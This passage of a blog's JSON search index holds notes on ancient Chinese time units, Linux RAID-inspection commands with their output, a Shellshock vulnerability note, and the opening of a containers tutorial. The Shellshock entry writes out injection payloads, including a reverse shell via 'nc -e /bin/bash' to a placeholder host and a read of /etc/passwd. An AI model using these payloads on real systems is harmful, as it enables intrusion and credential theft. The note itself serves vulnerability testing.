07:00\u003cbr\u003e辰正 08:00\u003c/td\u003e\n          \u003ctd\u003e早食、宴食、蚤食\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e巳時\u003c/td\u003e\n          \u003ctd\u003e隅中\u003c/td\u003e\n          \u003ctd\u003e09:00-11:00\u003c/td\u003e\n          \u003ctd\u003e巳初 09:00\u003cbr\u003e巳正 10:00\u003c/td\u003e\n          \u003ctd\u003e日隅、禺中、日禺\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e午時\u003c/td\u003e\n          \u003ctd\u003e日中\u003c/td\u003e\n          \u003ctd\u003e11:00-13:00\u003c/td\u003e\n          \u003ctd\u003e午初 11:00\u003cbr\u003e午正 12:00\u003c/td\u003e\n          \u003ctd\u003e日正、日午、日高、正午、中午、亭午、日當午、平午、平晝\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e未時\u003c/td\u003e\n          \u003ctd\u003e日昳\u003c/td\u003e\n          \u003ctd\u003e13:00-15:00\u003c/td\u003e\n          \u003ctd\u003e未初 13:00\u003cbr\u003e未正 14:00\u003c/td\u003e\n          \u003ctd\u003e日昃、日仄、日側、日跌、日斜、日映、日央\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e申時\u003c/td\u003e\n          \u003ctd\u003e晡時\u003c/td\u003e\n          \u003ctd\u003e15:00-17:00\u003c/td\u003e\n          \u003ctd\u003e申初 15:00\u003cbr\u003e申正 16:00\u003c/td\u003e\n          \u003ctd\u003e餔時、日餔、日晡、日鋪、日稷、日夕、夕食\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e酉時\u003c/td\u003e\n          \u003ctd\u003e日入\u003c/td\u003e\n          \u003ctd\u003e17:00-19:00\u003c/td\u003e\n          \u003ctd\u003e酉初 17:00\u003cbr\u003e酉正 18:00\u003c/td\u003e\n          \u003ctd\u003e日沒、日沉、日西、日落、日逝、日晏、日旴、日晦、傍晚\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e戌時\u003c/td\u003e\n          \u003ctd\u003e黃昏\u003c/td\u003e\n          \u003ctd\u003e19:00-21:00\u003c/td\u003e\n          \u003ctd\u003e戌初 19:00\u003cbr\u003e戌正 20:00\u003c/td\u003e\n          \u003ctd\u003e日夕、日末、日暮、日晚、日闇、日墮、日暗、日曛、曛黃\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e亥時\u003c/td\u003e\n          \u003ctd\u003e人定\u003c/td\u003e\n          \u003ctd\u003e21:00-23:00\u003c/td\u003e\n          \u003ctd\u003e亥初 21:00\u003cbr\u003e亥正 22:00\u003c/td\u003e\n          \u003ctd\u003e定昏、夤夜\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"更\"\u003e更\u003c/h5\u003e\n\u003cp\u003e漢代皇宮中值班人員分五個班次，按時更換，叫「五更」，由此古人把便把一夜分為五更，每更為一個時辰。\n戌時為一更，亥時為二更，子時為三更，丑時為四更，寅時為五更\u003c/p\u003e","tags":["URL","Time"],"title":"古代計時單位"},{"categories":["URL","Linux","RAID","command line"],"contents":" How to Detect RAID Information in Linux lspci lspci | grep RAID 00:1f.2 RAID bus controller: Intel Corporation 82801 Mobile SATA Controller [RAID mode] (rev 04) lshw lshw -class storage *-raid description: RAID bus controller product: 82801 Mobile SATA Controller [RAID mode] vendor: Intel Corporation physical id: 1f.2 bus info: pci@0000:00:1f.2 logical name: scsi0 version: 04 width: 32 bits clock: 66MHz capabilities: raid msi pm bus_master cap_list emulated configuration: driver=ahci latency=0 resources: irq:26 ioport:f0d0(size=8) ioport:f0c0(size=4) ioport:f0b0(size=8) ioport:f0a0(size=4) ioport:f060(size=32) memory:f7e36000-f7e367ff smartctl dmesg | grep -i scsi [ 0.210852] SCSI subsystem initialized [ 0.341280] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 243) ... [ 1.213299] scsi 0:0:0:0: Direct-Access ATA ST320LT012-9WS14 YAM1 PQ: 0 ANSI: 5 [ 1.319886] sd 0:0:0:0: [sda] Attached SCSI disk [ 19.571008] sd 0:0:0:0: Attached scsi generic sg0 type 0 smartctl --all /dev/sda Model Family: Seagate Laptop HDD Device Model: ST320LT012-9WS14C Serial Number: S0V3R9LL LU WWN Device Id: 5 000c50 05be4653c Firmware Version: 0001YAM1 User Capacity: 320,072,933,376 bytes [320 GB] Sector Sizes: 512 bytes logical, 4096 bytes physical Rotation Rate: 5400 rpm Form Factor: 2.5 inches Device is: In smartctl database 7.3/5319 ATA Version is: ATA8-ACS T13/1699-D revision 4 SATA Version is: SATA 2.6, 3.0 Gb/s (current: 3.0 Gb/s) Local Time is: Sat Nov 19 20:52:01 2022 PKT SMART support is: Available - device has SMART capability. SMART support is: Enabled ... MegaCLI megacli -LDInfo -Lall -aALL Adapter 0 -- Virtual Drive Information: Virtual Drive: 0 (Target Id: 0) Name : SEAGATE RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0 Size : 320 GB Sector Size : 512 Mirror Data : 320 GB State : Optimal ... lsscsi lsscsi [0:0:0:0] disk ATA ST320LT012-9WS14 YAM1 /dev/sda Vendor-Specific Tools omreport storage vdisk List of Virtual Disks in the System Controller SEAGATE Laptop HDD ID : 0 Status : Ok Name : SEAGATE State : Ready Hot Spare Policy violated : Not Assigned Encrypted : No Layout : RAID-0 Size : 320.00 GB (343597383680 bytes) T10 Protection Information Status : No Associated Fluid Cache State : Not Applicable Device Name : /dev/sda Bus Protocol : ATA Media : HDD Read Policy : Adaptive Read Ahead Write Policy : Write Back Cache Policy : Not Applicable Stripe Element Size : 128 KB Disk Cache Policy : Enabled ","date":"November 28, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221128-raid-information-command-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/raid-information-command-line\" target=\"_blank\" rel=\"noopener\"\u003eHow to Detect RAID Information in Linux\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"lspci\"\u003elspci\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elspci | grep RAID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e00:1f.2 RAID bus controller: Intel Corporation \u003cspan style=\"color:#ae81ff\"\u003e82801\u003c/span\u003e Mobile SATA Controller \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eRAID mode\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003erev 04\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"lshw\"\u003elshw\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elshw -class storage\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  *-raid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       description: RAID bus controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       product: \u003cspan style=\"color:#ae81ff\"\u003e82801\u003c/span\u003e Mobile SATA Controller \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eRAID mode\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       vendor: Intel Corporation\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       physical id: 1f.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       bus info: pci@0000:00:1f.2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       logical name: scsi0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       version: \u003cspan style=\"color:#ae81ff\"\u003e04\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       width: \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e bits\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       clock: 66MHz\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       capabilities: raid msi pm bus_master cap_list emulated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       configuration: driver\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eahci latency\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       resources: irq:26 ioport:f0d0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0c0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0b0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f0a0\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e ioport:f060\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esize\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e32\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e memory:f7e36000-f7e367ff\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"smartctl\"\u003esmartctl\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edmesg | grep -i scsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    0.210852\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e SCSI subsystem initialized\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    0.341280\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Block layer SCSI generic \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ebsg\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e driver version 0.4 loaded \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003emajor 243\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    1.213299\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e scsi 0:0:0:0: Direct-Access     ATA      ST320LT012-9WS14 YAM1 PQ: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e ANSI: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e    1.319886\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e sd 0:0:0:0: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esda\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Attached SCSI disk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e   19.571008\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e sd 0:0:0:0: Attached scsi generic sg0 type \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmartctl --all /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eModel Family:     Seagate Laptop HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice Model:     ST320LT012-9WS14C\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSerial Number:    S0V3R9LL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLU WWN Device Id: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e 000c50 05be4653c\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFirmware Version: 0001YAM1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser Capacity:    320,072,933,376 bytes \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector Sizes:     \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes logical, \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e bytes physical\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRotation Rate:    \u003cspan style=\"color:#ae81ff\"\u003e5400\u003c/span\u003e rpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eForm Factor:      2.5 inches\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice is:        In smartctl database 7.3/5319\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eATA Version is:   ATA8-ACS T13/1699-D revision \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSATA Version is:  SATA 2.6, 3.0 Gb/s \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecurrent: 3.0 Gb/s\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLocal Time is:    Sat Nov \u003cspan style=\"color:#ae81ff\"\u003e19\u003c/span\u003e 20:52:01 \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e PKT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMART support is: Available - device has SMART capability.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMART support is: Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"megacli\"\u003eMegaCLI\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emegacli -LDInfo -Lall -aALL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdapter \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e -- Virtual Drive Information:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVirtual Drive: \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eTarget Id: 0\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eName                : SEAGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize                : \u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector Size         : \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMirror Data         : \u003cspan style=\"color:#ae81ff\"\u003e320\u003c/span\u003e GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eState               : Optimal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"lsscsi\"\u003elsscsi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elsscsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e0:0:0:0\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e    disk    ATA      ST320LT012-9WS14 YAM1  /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"vendor-specific-tools\"\u003eVendor-Specific Tools\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eomreport storage vdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eList of Virtual Disks in the System\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eController SEAGATE Laptop HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eID                                : \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStatus                            : Ok\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eName                              : SEAGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eState                             : Ready\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHot Spare Policy violated         : Not Assigned\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEncrypted                         : No\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLayout                            : RAID-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSize                              : 320.00 GB \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e343597383680\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eT10 Protection Information Status : No\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAssociated Fluid Cache State      : Not Applicable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice Name                       : /dev/sda\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBus Protocol                      : ATA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eMedia                             : HDD\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRead Policy                       : Adaptive Read Ahead\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWrite Policy                      : Write Back\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCache Policy                      : Not Applicable\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStripe Element Size               : \u003cspan style=\"color:#ae81ff\"\u003e128\u003c/span\u003e KB\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk Cache Policy                 : Enabled\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","RAID","command line"],"title":"How to Detect RAID Information in Linux"},{"categories":["URL","Linux","SHELL","command line"],"contents":" Test Whether a Server Is Vulnerable to Shellshock Bug The Shellshock Bug env x=\u0026#39; () {:;};\u0026#39; Exploiting Shellshock Bug A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines. The ignored commands from the user are put in the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable. If the user\u0026rsquo;s default shell is Bash, the Bash shell will parse the value of the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable on start-up and run the embedded commands. Examples of Shellshock Exploit Commands ## 1 curl -H \u0026#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443\u0026#34; 192.168.x.y/CGI-bin/hello.cgi ## 2 curl --insecure 192.168.x.x -H \u0026#34;User-Agent: () { :; }; /bin/cat /etc/passwd\u0026#34; use nmap script to test for the vulnerability nmap -sV -p- --script http-shellshock 192.168.x.x nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.x.x ","date":"November 28, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221128-linux-shellshock-bug/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.baeldung.com/linux/shellshock-bug\" target=\"_blank\" rel=\"noopener\"\u003eTest Whether a Server Is Vulnerable to Shellshock Bug\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"the-shellshock-bug\"\u003eThe Shellshock Bug\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenv x\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; () {:;};\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"exploiting-shellshock-bug\"\u003eExploiting Shellshock Bug\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eA substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.\u003c/li\u003e\n\u003cli\u003eThe ignored commands from the user are put in the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable. If the user\u0026rsquo;s default shell is Bash, the Bash shell will parse the value of the \u0026ldquo;SSH_ORIGINAL_COMMAND\u0026rdquo; environment variable on start-up and run the embedded commands.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"examples-of-shellshock-exploit-commands\"\u003eExamples of Shellshock Exploit Commands\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443\u0026#34;\u003c/span\u003e 192.168.x.y/CGI-bin/hello.cgi\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl --insecure 192.168.x.x -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;User-Agent: () { :; }; /bin/cat /etc/passwd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003euse nmap script to test for the vulnerability\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sV -p- --script http-shellshock 192.168.x.x\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sV -p- --script http-shellshock --script-args uri\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/cgi-bin/bin,cmd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003els 192.168.x.x\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Linux","SHELL","command line"],"title":"Test Whether a Server Is Vulnerable to Shellshock Bug"},{"categories":["URL","Linux","container"],"contents":" Containers from scratch Container file systems $ wget https://github.com/ericchiang/containers-from-scratch/releases/download/v0.1.0/rootfs.tar.gz $ sha256sum rootfs.tar.gz c79bfb46b9cf842055761a49161831aee8f4e667ad9e84ab57ab324a49bc828c rootfs.tar.gz $ # tar needs sudo to create /dev files and setup file ownership $ sudo tar -zxf rootfs.tar.gz $ ls rootfs bin dev home lib64 mnt proc run srv tmp var boot etc lib media opt root sbin sys usr $ ls -al rootfs/bin/ls -rwxr-xr-x. 1 root root 118280 Mar 14 2015 rootfs/bin/ls chroot it allows us to restrict a 